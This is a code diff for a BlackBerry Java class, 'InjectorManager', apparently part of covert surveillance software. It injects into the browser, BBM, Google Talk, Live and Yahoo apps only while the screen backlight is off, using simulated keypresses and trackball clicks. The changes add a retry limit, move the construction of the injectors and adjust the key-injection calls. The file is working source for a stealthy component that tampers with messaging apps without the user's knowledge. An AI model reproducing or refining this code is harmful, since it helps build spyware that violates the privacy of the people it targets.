@@ -42,6 +42,8 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
     private static final int RUNON_APP = 1;
     private static final int RUNON_BACKLIGHT = 2;
     private static final int KEY_LOCK = 4099;
+    
+    private static final int MAX_TRIES = 3;
     //#ifdef DEBUG
     private static Debug debug = new Debug("InjectorManager",
             DebugLevel.VERBOSE);
@@ -73,6 +75,12 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
         }
         return instance;
     }
+    
+    private InjectorManager(){
+        injectors = new AInjector[] { new BrowserInjector(), new BBMInjector(),
+                new GoogleTalkInjector(), new LiveInjector(),
+                new YahooInjector() };
+    }
 
     public void start() {
         //#ifdef DEBUG
@@ -98,9 +106,7 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
         appListener.addBacklightObserver(this);
 
         //appListener.suspendable(true);
-        injectors = new AInjector[] { new BrowserInjector(), new BBMInjector(),
-                new GoogleTalkInjector(), new LiveInjector(),
-                new YahooInjector() };
+
 
         if (!Backlight.isEnabled()) {
             injectAll();
@@ -149,14 +155,17 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
 
         try {
 
+            boolean allInjected=true;
             for (int i = 0; i < injectors.length; i++) {
                 injector = injectors[i];
 
-                inject(injector);
+                allInjected &= inject(injector);
             }
 
         } finally {
-            injecting = false;
+            synchronized (this) {
+                injecting = false;
+            }
         }
 
     }
@@ -185,6 +194,13 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
             //#endif
             return true;
         }
+        
+        if(injector.getTries() > MAX_TRIES){
+            //#ifdef DEBUG
+            debug.trace("inject, too many tries");
+            //#endif
+            return true;
+        }
 
         if (Backlight.isEnabled()) {
             //#ifdef DEBUG
@@ -204,6 +220,8 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
             //#ifdef DEBUG
             debug.trace("inject, executed: " + name);
             //#endif
+            
+            injector.incrTries();
 
             Utils.sleep(500);
             if (checkForeground(name)) {
@@ -315,6 +333,10 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
         debug.trace("callSystemMenu");
         //#endif
 
+        //#ifdef BBM_DEBUG
+        Backlight.enable(true);
+        //#endif
+        
         KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
         Utils.sleep(500);
 
@@ -322,16 +344,16 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
             //#ifdef DEBUG
             debug.trace("callMenuByKey, version 7, track ball up");
             //#endif
-            KeyInjector.trackBallRaw(20, true);
+            KeyInjector.trackBallUp(20);
             Utils.sleep(500);
-            KeyInjector.trackBallRawClick();
+            KeyInjector.trackBallClick();
         } else {
             //#ifdef DEBUG
-            debug.trace("callMenuByKey, version <7, pressing menu");
+            debug.trace("callMenuByKey, version <7, pressing menu: " + menu);
             //#endif
-            KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
+            KeyInjector.pressKey(menu.toString().toLowerCase().charAt(0));
             Utils.sleep(500);
-            KeyInjector.trackBallRawClick();
+            KeyInjector.trackBallClick();
         }
 
         Utils.sleep(500);
